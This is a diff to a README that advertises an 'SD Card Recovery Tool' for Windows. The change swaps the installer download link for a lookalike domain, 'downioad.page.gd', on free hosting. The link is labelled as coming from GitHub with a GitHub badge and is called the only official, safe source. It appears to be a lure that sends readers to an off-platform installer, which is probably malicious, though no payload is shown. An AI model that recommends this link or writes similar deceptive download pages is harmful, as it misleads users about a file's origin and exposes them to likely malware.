@@ -2,7 +2,7 @@
 
 SD Card Recovery Tool is a comprehensive software solution designed to assist users in recovering lost, deleted, or inaccessible files from SD cards on Windows operating systems. This tool is ideal for situations where data loss occurs due to accidental deletion, formatting, corruption, or physical damage to the SD card. With its user-friendly interface and powerful recovery algorithms, SD Card Recovery Tool ensures that your precious memories and important documents are restored safely.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -72,7 +72,7 @@ A: The duration varies based on the SD card's size, condition, and the number of
 
 To get started with recovering your lost files, download the latest version of SD Card Recovery Tool from the link below:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This download link is the only official source for the tool, ensuring you receive a safe and updated version.
 
